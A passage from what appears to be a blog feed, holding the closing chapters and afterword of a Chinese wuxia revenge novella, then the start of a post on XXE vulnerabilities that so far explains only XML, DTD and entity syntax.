<h3 id="2-0］"><a href="#2-0］" class="headerlink" title="[2.0］"></a>[2.0］</h3><p>　　位于大地之中的风莲国山明水秀，古色古香，城内的渭河贯穿南北，九曲回肠。城中渭河上，架空着一座金碧辉煌的香楼，碧瓦朱甍，高耸入云。香楼正门上“云烟楼”三个金色大字跃然于眼前。<br>　　云烟楼内不时传出几许欢声笑语，想必是姑娘们琴棋书画精通绝伦，美貌身姿惊人，引得官商富人发出淫邪的恶笑。每每望着姑娘们的舞姿，他们就会忘乎所以，口水不免飞流直下。作为一名冷血刺客，面对如此烟云，我丝毫不会深陷其中，直到遇见了月姬。月姬是云烟楼最有名的歌伎之一，她的一颦一簇都足以让看客神魂颠倒。然而，最让人销魂的还是她的琴声，每一弦都沁入身心，深入骨髓，让人深陷其中，无法自拔，“转轴拨弦三两声，未成曲调先有情”。<br>　　因为月姬，每当被梅生赶出家门，我都流落于云烟楼中，享受着轻歌曼舞，言笑晏晏。与其他客人不同的是，我只要求月姬相陪，即使她只卖艺不卖身，我也会重金相邀房内，举酒言欢，静静地欣赏着她弹奏离歌赋。<br>　　酒入肚囊，醉上心头，迷糊地望着眼前的月姬，我似乎找到了知己，倒头栽入月姬怀中哭诉着自己的委屈伤痛。天光极盛，刺入眼帘，我掀开被子，望着坐在窗前抚琴的月姬，尴尬地笑道：“姑娘，昨晚饮酒过甚，让你受惊了”。月姬起身摆好木琴，转身微微低着头望向我，微红的脸上写满羞涩。窗外清风徐徐，吹动着月姬的长发，风中衣袂飘飘，随风飘来的是淡淡的清香，我一时入了迷，全然不知月姬已离开了房间。<br>　　此后，每当完成任务收到赏金后，我都会夜留于月姬的闺房之内。月姬也习惯地拿出我最爱的女儿红，然后美美地弹奏着《春江花月夜》。酒过三巡，曲消音散，我依靠着窗台，望着浩瀚星海，抚摸着手臂上的刺青。除了梅生，谁也不知道我手臂上的刺青，包括月姬。原本她应该是会知道的，直到那天她在台上翩翩起舞，莺歌燕舞间清风吹起了她的长袖，透过薄薄的轻纱，一朵莲花刺青显露于手臂。后来，我从梅生口中得知，当年与我们一起被刻上刺青的还有一名女孩，现如今她已沦落云烟之地，艺名月姬。<br>　　正因为此事，我打消了向月姬显露刺青的计划，原因就在于不想打破她现在的生活，而让她因为自己勾起伤心往事。也是从那天起，我开始不接林枫的生意。作为刺客，难免身处险境，若是被人发现手臂上的刺青，不仅连累梅生，更会连累月姬，毕竟月姬手臂上的刺青早已不是什么秘密。世人永远是庸俗的，同样的刺青，刻在月姬身上，就成为了取悦眼球的纹饰。<br>　　林枫是林家堡主林天南的公子，家财万贯，声震武林。此人风度翩翩，温文尔雅，长得更是神明爽俊，目若朗星。至于此前我与他唯一的交集，也就是生意上的往来。以我的职业来说，生意上的往来就是他付钱，我杀人。像他这样的名门望族子弟，是不可能冒险行刺的，而林门仇家众多，因此我就成了林枫最好的生意伙伴。<br>　　我们的交易场所往往选择在云烟楼，此地云烟四起，歌舞淫乐间，谁也不会在意我们谈论的内容，即使有所耳闻，也全当酒后的胡言。即便如此，我们的接头也不能随随便便。每当林枫往酒杯倒酒，而后将酒壶壶嘴对着酒杯时，则寓意有活可接，而酒杯内酒的多少就寓意刺杀任务的难度高低。若是以往，我二话不说便上前拿起酒杯喝下，示意接下此活。而如今，我要么置之不理，要么上前拿起酒杯，洒向地面，示意此活接不了。<br>　　随着时光的流逝，原本以为再也不会接手林枫的买卖，可现实总归存在无奈。每当身处月姬闺房，抱着怀中的人间尤物，为她赎身的想法便浮动在脑海中。然而，巨额的赎身金像一块巨石重重压在我的心头，数月夜寝于云烟楼的生活，已花完了我所有的积蓄，此时唯有出山才能筹得赎金。<br>　　捆紧纸条，放飞的白鸽翱翔于蓝天下，飞往林家堡。</p>
<h3 id="3-0］"><a href="#3-0］" class="headerlink" title="[3.0］"></a>[3.0］</h3><p>　　隔日黄昏，林枫摇曳着纸扇，踏进了云烟楼。随即，楼内砸开了锅，姑娘们纷纷涌向眼前的豪门公子，不知不觉中姑娘们的芙蓉色上衣已经敞开，露出白皙的锁骨，扭腰弄眉地围绕着林枫。林枫还是一贯的孤傲，如同几年前的第一次相遇，撇着眼对我露出不屑的眼神，尽管眼前美女如云，他也不正眼相看。<br>　　林枫径直地走向我，待到跟前，俯身贴近我微醉的脸庞，深深相惜，此情此景真是羡煞云烟楼的姑娘。我一手酒瓶一手酒杯，尴尬地笑道：“林兄，我可没那癖好！”。林枫贴着耳朵苦笑道：“为了避开云烟楼的姑娘们，刺兄，只能委屈你了！”，随即抢过我手中的酒杯，饮下后放声大笑。留下我无辜地望了望身旁的月姬，撇着嘴直摇头。<br>　　林枫拉起卧倒在墙角的我，轻声说道：“此次任务事关重大，你我房内相商”，我借着酒劲一头栽进林枫的怀中，两人缠绵着步入厢房，留下姑娘们一脸的茫然，唯独月姬抿着嘴独乐。<br>　　厢房内，林枫摆好酒杯，往里缓缓倒酒。酒杯中，暗褐色的酒水由浅变深，直至溢出杯口。我二话不说，上前拿起酒杯喝下，对着林枫说道：“只要赏金足够，其他的不用多说”。话虽如此，我也不能胡乱接活，如若接了自己能力所不及的，怕是要丢了性命。林枫与我表面上算是生意伙伴，实则通过几年的合作，也建立了兄弟情义。他能交给我的活，必定是不会伤及我性命的。<br>　　直到入夜，我隐匿于相天府深墙之上，偷偷望着深墙内密集的兵力，回想起自己对林枫说的话，肠子都悔青了。林枫凭借着几年的情义，骗取我的感情，把我往火堆里推。我心想着，回去一定要多收点赏金，要不然就绝交。<br>　　还没等我气消，交替巡逻的近卫队就发现了我的踪影。只见他们快速散开阵型，对我形成了包围阵势。眼见自己被围得水泄不通，我只能无奈地望着头顶飞过的乌鸦，心想着插翅也难逃了。不过作为一名敬业的刺客，若是束手就擒则显得太没有职业道德，于是我亮出了弯刀，脚尖轻点深墙之上，轻身飞跃于屋瓦之间。<br>　　明月之下，弯刀闪现着寒光，身影过处，尸骸一片。激战维持了几个时辰，最终以我体力不支告负。刀光剑影间，我身受数刀，血流不止，直至被死死地逼在深墙之内。当我束手无策之时，一道黑影闪过，随即惨叫声此起彼伏。<br>　　黑影见机背起我往墙外飞去，只见他身轻如燕，一转眼便逃离了包围圈。驮负在黑影上，我轻轻地敲了敲黑衣人的脑袋，哭丧着说道：“好你个梅生，现在才来救我，可怜我满身是伤”。梅生解下面纱，大笑道：“你活该，将军府你都敢闯，这不是找死吗！要不是月姬找到我，请求我暗中保护你，你早已是死人啦”。<br>　　我敲打着梅生的后背，埋怨道：“这得怪你，拥有绝世的轻功，却甘心当一名戏子，害得我每夜只身一人游走于死亡边缘，我好惨啊！”。梅生打着哈气，慵懒地说道：“你再啰啰嗦嗦，唧唧歪歪，我就把你扔下去，到时你才叫惨！”。我朝他后脑勺翻了翻白眼，身子一摊重重地压在他身上，随即缓缓地闭上双眼，安心入睡。<br>　　次日清晨，天光透过纸窗刺入眼帘。月姬坐在床前，手里端着热汤，睁着水灵的眼温柔地看着我，不时用嘴吹散汤中的热气。我微笑着喝下月姬亲手熬制的良药，良药虽苦，入口即甜啊！<br>　　原本以为林枫再也没脸来见我了，谁知他的脸皮不是一般厚。临近正午，林枫提着几包礼品，登门造访，我黑着脸指着他的鼻子骂道：“要不是看在你替月姬赎身的份上，我早揍你了！”。林枫脸上也略显尴尬，羞愧地说道：“刺兄，此次是我没有设想周全，让你受苦了”。看在钱的面子上，此事也就不了了之了，况且我也实在不想失去财主，好在也没伤及性命。<br>　　此次受伤后，我再也没有接过活，整日游走于梅生的戏场与林家堡之间。梅生对戏曲的兴趣极其浓厚，当年他拿出所有的积蓄加入了老戏班，经过十几年的摸爬滚打，如今他已是戏班主，绝对的风莲城第一名角。至于我们的轻功，则是梅生无意中捡到一本武功秘籍，我们起初只是随着瞎练，没想到却练就得身轻如燕。而我造访林家堡的目的，就是为了拿取生活的补贴，全当是林枫为我受伤付的赔偿金。而继那次受伤后，林枫待我如亲兄弟，林家堡像是对我设有特权，出入自由。<br>　　当然，我也不是厚颜无耻之徒，拿满一年的赔偿金后，我与月姬合计着开了一家酒馆，凭借着月姬的美艳，顾客自然是络绎不绝，生活也总算开始平静而滋润。</p>
<h3 id="4-0］"><a href="#4-0］" class="headerlink" title="[4.0］"></a>[4.0］</h3><p>　　高老爷的死，是林枫急急忙忙告诉我的。据林枫说，高老爷是被人用利器直插心脏，一命呜呼的。官府为了找出元凶，在城内贴出皇榜，虽说凶手蒙着面，但高老爷的家丁看见了凶手手臂上刻着刺青。<br>　　林枫硬拉着我，挤进皇榜前的人群。只见皇榜上的通缉犯蒙着黑纱，而在他的左手手臂上鲜明地刻着莲花刺青。此时，我的脑海中首先浮现出的是月姬，于是连忙挤出人群，跑回酒馆。奔跑间，远远地望见，军队包围了我们的酒馆，而月姬被上了手铐脚镣，押进了囚笼。我愤怒地奔跑着，伸手想要亮出弯刀，却被藏在角落的梅生死死地挡住。<br>　　兵头询问着月姬，“凶手手臂的刺青与你手臂上的无异，你可认罪？”。月姬摸了摸手臂上的莲花刺青，大笑道：“没错，我就是凶手，是我杀死高老爷的，与任何人无关！”。望着囚笼里远去的月姬，我痛彻心扉。<br>　　数月前，月姬知道我手臂上的莲花刺青后，便托付终身。而今，她为了我甘愿牺牲性命。我极力挣脱了梅生，死命地奔向月姬，迎面而来的却只有滚滚的烟尘，以及月姬远去的背影。<br>　　林家堡内，林枫、梅生与我围坐一地，商讨着劫狱大计。我们的计划是，以梅生为诱饵，引开监牢外的守军，然后由我潜进监牢救出月姬，林枫则负责出现意外时的救援，以及救援成功后接头我们逃离风莲国。<br>次日深夜，一行黑影隐匿于监牢外的竹林。我抬头仰望着夜空，眼看着即将乌云盖月，随即示意梅生行动开始。梅生终身一跃，脚尖轻弹于竹林之上，踏着竹叶，迎着黑风，翻身至监牢之外。<br>　　牢外的守军，纷纷前去追赶，梅生凭借着超凡的轻功，轻松翱翔于守军头颅之上，向竹林深处飞去。望着远去的守军，我赶忙飞身至监牢大门外。放眼监牢内，灯火通明，却异常的安静。脑海浮现出月姬的身影，我奋不顾身地步入监牢，四处寻找着月姬。然而，我所到之处，全都是空无一人。而在此时，门外传来密集的脚步声，我深知中计，便纵身飞向头顶的天窗，不料一张大网从天而降，重重地把我压倒在地。透过绳网，传来阵阵冷笑。随后，我被押进了囚笼，前往秘密监牢，而埋伏于竹林的救援队迟迟没有行动。<br>　　次日，我被五花大捆地押进位于地底的秘密监牢。牢笼里的月姬，哭喊着我的名字，泪已流干。狱头狠狠地把我揣进牢笼，望着眼前满身是伤的月姬，我心如刀绞。我轻拂着月姬的脸颊，将其拥于怀中，用手一遍遍地梳理着她的乱发。月姬像是一只受惊的小猫，死死地抱着我，空洞的眼神中透露着绝望。<br>　　紧紧地搂着月姬，我微笑着，即使面对死亡，我也有月姬相伴，死而无憾了。只可惜，今生无法再与梅生相见，也不知他身在何处？</p>
<h3 id="5-0］"><a href="#5-0］" class="headerlink" title="[5.0］"></a>[5.0］</h3><p>　　再见到林枫是几天后的事了。<br>　　凭借着林家堡的势力，林枫轻而易举地来到了秘密监牢。牢门缓缓开启，随着清脆的脚步声，迎面而来的是一席黑影。翻起头顶的黑帽后，一张俊秀的脸庞显露无疑。然而，此时林枫的脸上却显得异常的阴沉。他叹了口气，沉重地说道：“刺兄，看来是梅生想陷害你啊！”。<br>　　没等我回过神来，林枫就向我讲诉了劫狱当晚的情景。他说，那晚我进入监牢后，林枫便一直在暗处保护我，没想到梅生走后没多久便带着大批军队冲进了监牢，林枫深知中了梅生的套，便逃离了现场，准备日后再伺机营救。<br>　　凭借着与梅生朝夕相处二十几年的关系，我自然不会相信林枫的鬼话。至于，事实是否如林枫所诉，我不得而知，只是内心那份对梅生的兄弟情义告知我，不能怀疑他，即使世上只有我们三人手臂拥有莲花刺青，即使梅生迟迟没有露面。<br>　　林枫走后，他口中诉说的场景夜夜出现在我的梦中。梅生手持长剑，抵在我的脖颈，随即传来阵阵冷笑，冰冷刺骨。每个望不见星空的夜晚，我都被相同的梦境折磨着，梅生成了我逃不出梦魇。<br>　　林枫隔三岔五地到访监牢，每次都会带来梅生的情况。据他所说，梅生自从离开监牢后，便回到了家中。眼看着行刑期越来越近，我显得焦虑不安。相同的梦境，时时刻刻浮动在我的脑海中。林枫看出了我的焦虑，心生一计，凭借着他的势力，偷龙转凤也并不算难。在我们秘密相商后，林枫甘愿暂时代替我深陷牢笼，待我出去寻得梅生，把此事问清楚后，再换回林枫。<br>　　出发前，林枫无比坚信地望着我，默默地点点头，眼神不再是初次见面时的不屑，而是充满着信任与期许。<br>　　踏出监牢的大门，我飞身跃向半空，调动着全身的真气，踏着片片屋瓦飞向远方。<br>　　落地家门前的清溪岸，记忆如潮水般涌入大脑。那些年，梅生装睡的神情，梅生气得破口大骂的囧样，都历历在目。推开老旧的木门，随着咯吱的声响，阳光汇聚成一道光线，透着门缝照入屋内。梅生静坐堂前，紧闭的双目缓缓睁开，脸上不再是以往的春光，而是略显忧伤。<br>　　梅生摆了摆手，示意我坐在身旁，面对着眼前熟悉而陌生的梅哥，我乱了心神。望着我，梅生眼神中带着几分欣慰，说；“阿青，你能安然无恙的回来，我就放心了！”随即转眼定睛于远方，眼神中满是忧伤。<br>沉默片刻，梅生冷冷地笑着，只是脸上僵硬得面无表情，说：“你什么都不用问了，一切都是我干的，是我对不住你。答应我，一定要好好活着！”。说话间，梅生拿出了早已藏于怀中的匕首，狠狠地刺向了自己的心门，血流了一地。<br>　　我扶起倒地的梅生，望着他空洞的眼神中透露出来的悲伤，泪水溢满了眼眶。紧紧地抱着奄奄一息的他，我发了疯似地喊着，“为什么，这究竟是为什么？”。梅生贴着我的耳朵，死命地重复说着：“弟弟，快走！”。<br>　　随后，我便明白了梅生的意思。随着一阵阵脚步声，屋外集结了大批的军队，把老屋围得严严实实。 </p>
<h3 id="6-0］"><a href="#6-0］" class="headerlink" title="[6.0］"></a>[6.0］</h3><p>　　天光照在清溪上，水面闪显出层层白光，倒映出溪岸边的重重杀机。<br>　　拉开木门，迎着刺眼阳光下的是一层盔甲反射出的白色光芒。勉强地眯拢着双眼，待适应强光后，眼前渐渐清晰。前后几排的长弓兵，身披白皑皑的盔甲，手持长弓，伺机待发。随着一声号令，无数的弓箭从天而降，密如细雨，直直的射向屋内。<br>　　千钧一发之际，我迅速关闭了木门，向后连翻数次，只见弓箭从我身边唰唰直下。我搬起一张木桌，挡在身前，随着掩护慢慢靠近梅生的尸体。木桌下，我抱起梅生，听着屋外被箭射穿的声音，似乎看到了地狱的大门。<br>　　以往，每当走到生死关头，梅生都会奋不顾身地出现，而今，一切都不复存在了。片刻后，屋外停止了响动。我依附着地面，爬到窗前，透过被箭射穿的洞口望向屋外，成排的长弓兵装填着弓箭，手中握着火把。<br>　　随着一阵熟悉而陌生的冷笑，从人群中走出一个身影。透过窗户，清楚的看见身影的轮廓，包括那双不屑的眼神。林枫慢慢接近老屋，随即推开了木门。盯着踏入屋内的林枫，我眼神中透出绝望。林枫向我瞥了瞥眼，露出不屑的眼神，如同几年前的初次相遇，冷冷地说：“刺兄，可安好啊”，随即放声大笑。<br>　　我抹搽着眼角的泪水，淡淡地说道：“我早该想到是你”。林枫走向躺着的梅生，疯狂地踩踏着他的尸体，眼神中满是愤恨。我随即拿出腰间的弯刀，狠狠地刺向林枫。林枫回过神来，脚尖轻轻一弹，轻松躲开了我的刀锋。眼见扑了个空，我全力调动真气于刀尖，砍向林枫。然而，林枫的轻功远非我能及，数次进攻都被他轻松躲过。不知不觉中，他已绕到我的脑后，瞬间一把利刃穿胸而过，流淌出鲜血。随之而来的是一真呐喊，不要！月姬含着泪水，奔向屋内，眼看着就要接近倒地的我，却被林枫拦下。<br>　　“月妹，今天是我们报仇的大好日子，哭哭啼啼的像什么样子”林枫指着我对月姬说道：“怎么，心疼了？”。月姬带着哭腔说道：“哥，你答应过我不杀他的”。林枫吼叫着，“对仇家不可存仁慈之心，就像当年他们没有杀死我们，而今，我们得以报仇雪恨，对敌人的仁慈就是对自己的残忍。”说话间，林枫瞪大着双眼，死死地盯着我。<br>　　我冷笑着，干涩的眼睛已流干了泪，绝望地看着眼睛两位曾经的至亲至爱，说：“好！原来你们隐瞒了这么多秘密，原来这一切都只是你复仇的计划。如今，我也已是快死之人，有什么秘密都说出来吧，至少让我死得瞑目。”<br>　　林枫解开上衣，露出了手臂，那朵散发着青光的莲花清晰可见。他说，我们都属于青莲族人，手臂上的刺青是我们的族标。我们的族人，从前生活在遥远的北都，远离中土的纷扰。然而，直到一场瘟疫的爆发，使得族人死伤无数，最后只剩两大家族逃离出来，从此定居在了风莲国。而这两大家族，便是秋梅两家。梅生是我的亲兄弟，月姬则是林枫的亲妹妹。自从定居风莲国后，日子便一天天好转。可没曾想，一天夜里秋家突发大火，秋家人除了死里逃生的林枫与月姬，其余全都葬身火海。逃生后的林枫一口咬定，我的父母就是纵火的元凶，从此便对梅家积下了深仇大恨。<br>　　月姬紧紧地捂住耳朵，眼中不住的流泪。为了保住刺青的性命，月姬不惜牲牲良知帮助林枫，可她没想到，林枫的复仇计划中，从来就没有道义与守信。林枫说，劫狱当晚，逃离后的梅生望着冲入监牢的守兵，奋不顾身的折返营救，不料途中中了林枫早已布好的陷阱。然而，当梅生知道林枫的身份后，苦苦祈求林枫放过我，自己甘愿扛下所有的罪过，包括多年前秋家的那场火灾。就这样，林枫借着对我骗取的信任，借着梅生对我的愧疚，毫不留情地展开了他的复仇计划。而月姬只是整盘复仇计划中的一枚棋子，也是整个计划的开始。林枫放声大笑道，“那场大火之后不久，你们梅家便一年接一年的死人，真是报应啊。直到只剩下你俩，你哥便隐姓埋名，远离故居。时间能改变你们的名字，改变你们的容貌，却永远改变不了你们手臂上的刺青”。<br>　　我不解道，“你们怎么知道我手臂上的刺青？”。林枫望着月姬笑道，“月姬手臂上的莲花刺青显露于世人，本就是为了找出你们所安排的。平常人看了此刺青，定会心生好奇，而数月来我一直在暗中观察，只有你不为所动。原因只有一个，就是你也拥有莲花刺青”。<br>　　我仰天大笑着，直至嘴角流出鲜血，我强撑着最后一口气，望着神情恍惚的月姬，说：“你爱过我吗？”。<br>　　月姬沉默着，闭上眼的最后一刻，我望见月姬举起了匕首。…… </p>
<h3 id="7-0］"><a href="#7-0］" class="headerlink" title="[7.0］"></a>[7.0］</h3><p>　　匕首深深地插入月姬的心胸，鲜血从胸口流向地面，从地面流向刺青倒下的身躯。<br>　　林枫抱着奄奄一息的月姬，痛苦不已。从出生到现在，林枫唯一一次流下了眼泪，即使当年眼看着家人葬身火海，林枫愣是一点泪也没流。<br>　　月姬仰起头，凑着林枫的耳朵，断断续续地说，“哥……我觉得好轻松……我走后……你要……要好好照顾……自己”。林枫抱着断气的月姬怒吼着，响声震彻山谷。<br>　　林枫抱着月姬走出老屋，随即箭雨伴随着火焰，射向屋内，顿时一片火海。黑云压近，凡世间的尘埃浮浮滚滚，汇聚湿润的黑云，酝酿着一场暴雨。磅礴的雨滴敲打着大地，淋湿了早已脆弱不堪的心，几十年间的尘埃，随着滚滚而去的雨水，流淌在大地之上，消散于光阴之中。<br>　　林枫坐立悬崖边，抚摸着怀中的月姬，仰天承受着上天的洗礼。磅礴的大雨，落在林枫的发间，眉间，如织的记忆伴随着雨水，流淌进他的心里，尘封的往事渐渐清晰。<br>　　二十年前，秋家大院内，四个孩子嬉笑着。秋老爷在一旁看得乐在其中，随即设宴款待梅家两位公子。宴席间，秋老爷拿出一本武功秘籍赠与两位公子，并嘱咐要好生研习。年少的秋枫身为秋家大公子，曾多次恳求秋老爷教授武功，却屡屡遭到打骂。要说天赋，秋枫是四人中最好的，然而，在秋老爷心中，秋枫戾气太重，并不适合练武，因此始终没有传授秋枫武功。长此以往，年少的秋枫心中横生恨意，便在一个夜深人静的晚上偷出了家传的武功秘籍，不料却被秋老爷发现。惜子的秋老爷不忍下重手，秋枫则趁机暗施黑手，杀害了秋老爷。为了毁尸灭迹，秋枫纵火烧了秋老爷的房间。谁知火势瞬间就无法控制，四处蔓延至整幢大宅，秋枫见状赶忙叫醒了睡梦中的秋月，逃离了火海。因为对梅家两位公子的嫉恨，秋枫便把纵火的元凶推给梅家。<br>　　逃离后的秋枫幸得林家堡收留，改姓为林，而为了防止秋月道出整个事件的始末，便将她卖入了云烟楼，艺名月姬。自此以后，秋枫便不断雇凶杀害梅家人，直到只剩下梅家两位公子神秘失踪。<br>　　随着时间的推移，林枫对父母对妹妹的负罪感渐渐消失，反之剧增的便是对梅家的仇恨。甚至，在他脑中的那段记忆已经变形，那个纵火烧死自己家人，将自己妹妹卖入云烟楼的不再是自己，而是梅家人。<br>　　时光荏苒，仇恨在林枫心中越演越烈，直到他得知了梅家两位公子的下落，复仇计划就在他心中生根发芽。月黑风高的夜晚，他身穿黑衣潜入高府宅院，杀害高老爷后，撕下袖子，在月光下露出散发着青光的莲花刺青。<br>　　月姬被捕后，利用刺青对她的爱，一步步地把他与梅生引入圈套。最后，只需凭借着自己骗取的信任，挑拨梅家两兄弟的关系，使两人互相残杀，而自己坐收渔翁之利，让他们如同当年的秋家人，葬身火海。<br>　　然而，无论他的计划多周密，月姬对刺青的真情是他无法控制的。而在月姬心中，自己不顾一切地帮助着林枫，只是为了保护自己深爱的刺青。也为了自己唯一的亲人能早日回头，月姬一直隐瞒着当年的那段尘封往事。可她不明白，那个曾经救自己出火场的秋枫早已葬身火海，而后的林枫只不过是一具被仇恨包裹着的行尸走肉。<br>　　躯壳下的灵魂早已不在，不变的只是手臂上散发着青光的莲花刺青，刻下了凄美的伤疤，无法抹去，深入骨髓。</p>
<h3 id="8-0］"><a href="#8-0］" class="headerlink" title="[8.0］"></a>[8.0］</h3><p>　　尘封的往事渐渐清晰，而林枫的心却渐渐迷茫，自己多年筹划的复仇计划，自己设身处地想置于死地的梅家，只不过是自己为当年罪行找的替罪羊。<br>　　大雨冲刷着大地，尘埃流失后露出那个找寻多年的凶手竟是自己，林枫痛哭流涕，紧抱着月姬，悲痛的哭喊着，夹杂着暴雨声，久久回荡在尘世。 </p>
<h3 id="9-0］"><a href="#9-0］" class="headerlink" title="[9.0］"></a>[9.0］</h3><p>　　伴随着雨滴，林枫抱起月姬，纵身跃入了万丈悬崖。……</p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>　　这是一篇故事相对比较苍白的小说，文风也比较小白，现在读起来感觉很多情节不够合理，但本篇的题材是我偏爱的那种。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;用刺青，刻下凄美的伤疤，无法抹去，深入骨髓&lt;/blockquote&gt;&lt;br&gt;　　怀旧原创小说三部曲，这是最后一篇了，相信我，发完这篇我不会再发小说，是时候该好好研究研究技术了，不能整天不务正业。&lt;br&gt;
    
    </summary>
    
      <category term="诗意年华" scheme="http://thief.one/categories/%E8%AF%97%E6%84%8F%E5%B9%B4%E5%8D%8E/"/>
    
    
      <category term="原创小说" scheme="http://thief.one/tags/%E5%8E%9F%E5%88%9B%E5%B0%8F%E8%AF%B4/"/>
    
  </entry>
  
  <entry>
    <title>浅谈XXE漏洞攻击与防御</title>
    <link href="http://thief.one/2017/06/20/1/"/>
    <id>http://thief.one/2017/06/20/1/</id>
    <published>2017-06-20T02:54:08.000Z</published>
    <updated>2017-07-25T12:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">你会挽着我的衣袖，我会把手揣进裤兜</blockquote><br>　　之前在参加一场CTF竞赛中遇到了xxe漏洞，由于当时并没有研究过此漏洞，解题毫无头绪。为了弥补web安全防御知识以及减少漏洞利用短板，我翻阅了一些关于xxe漏洞的资料，学习后在此总结分享。<br><a id="more"></a></p>
<h3 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h3><p>在介绍xxe漏洞前，先学习温顾一下XML的基础知识。XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p>
<h4 id="XML文档结构"><a href="#XML文档结构" class="headerlink" title="XML文档结构"></a>XML文档结构</h4><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;!--XML申明--&gt;</div><div class="line">&lt;?xml version=<span class="string">"1.0"</span>?&gt; </div><div class="line"></div><div class="line">&lt;!--文档类型定义--&gt;</div><div class="line">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</div><div class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</div><div class="line">&lt;!ELEMENT to (<span class="comment">#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></div><div class="line">&lt;!ELEMENT from (<span class="comment">#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></div><div class="line">&lt;!ELEMENT head (<span class="comment">#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></div><div class="line">&lt;!ELEMENT body (<span class="comment">#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></div><div class="line">]]]&gt;</div><div class="line"></div><div class="line">&lt;!--文档元素--&gt;</div><div class="line">&lt;note&gt;</div><div class="line">&lt;to&gt;Dave&lt;/to&gt;</div><div class="line">&lt;from&gt;Tom&lt;/from&gt;</div><div class="line">&lt;head&gt;Reminder&lt;/head&gt;</div><div class="line">&lt;body&gt;You are a good man&lt;/body&gt;</div><div class="line">&lt;/note&gt;</div></pre></td></tr></table></figure></p>
<p>由于xxe漏洞与DTD文档相关，因此重点介绍DTD的概念。</p>
<h4 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h4><p>文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。<br>内部声明DTD:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</div></pre></td></tr></table></figure></p>
<p>引用外部DTD:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE 根元素 SYSTEM <span class="string">"文件名"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>DTD文档中有很多重要的关键字如下：</p>
<ul>
<li>DOCTYPE（DTD的声明）</li>
<li>ENTITY（实体的声明）</li>
<li>SYSTEM、PUBLIC（外部资源申请）</li>
</ul>
<h4 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h4><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。<br>实体按类型主要分为以下四种：</p>
<ul>
<li>内置实体 (Built-in entities)</li>
<li>字符实体 (Character entities)</li>
<li>通用实体 (General entities)</li>
<li>参数实体 (Parameter entities)</li>
</ul>
<p>实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。<br>完整的实体类别可参考 <a href="https://www.tutorialspoint.com/dtd/dtd_entities.htm" target="_blank" rel="external">DTD - Entities</a></p>
<h4 id="实体类别介绍"><a href="#实体类别介绍" class="headerlink" title="实体类别介绍"></a>实体类别介绍</h4><p>参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。<br>参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。</p>
<p>内部实体：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名称 <span class="string">"实体的值"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>外部实体:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名称 SYSTEM <span class="string">"URI"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>参数实体：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % 实体名称 <span class="string">"实体的值"</span>&gt;</div><div class="line">或者</div><div class="line">&lt;!ENTITY % 实体名称 SYSTEM <span class="string">"URI"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>实例演示：除参数实体外实体+内部实体<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">    &lt;!ENTITY name <span class="string">"nMask"</span>&gt;]&gt;</div><div class="line">&lt;foo&gt;</div><div class="line">        &lt;value&gt;&amp;name;&lt;/value&gt; </div><div class="line">&lt;/foo&gt;</div></pre></td></tr></table></figure></p>
